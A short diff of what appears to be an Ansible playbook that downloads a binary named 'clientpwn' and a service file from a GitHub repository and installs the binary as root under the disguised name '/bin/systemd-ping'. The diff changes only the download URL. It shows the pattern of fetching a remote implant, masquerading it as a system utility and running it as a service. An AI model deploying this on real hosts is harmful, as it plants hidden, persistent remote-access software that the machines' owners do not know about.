@@ -4,7 +4,7 @@
   become: yes
 
   vars:
-    binary_url: "https://raw.githubusercontent.com/miller-js/Ghost/refs/heads/main/deploy/clientpwn"
+    binary_url: "https://raw.githubusercontent.com/miller-js/Ghost/refs/heads/main/deploy/clientpwn_binary"
     service_url: "https://raw.githubusercontent.com/miller-js/Ghost/refs/heads/main/deploy/client.service"
 
     binary_dest: "/bin/systemd-ping"
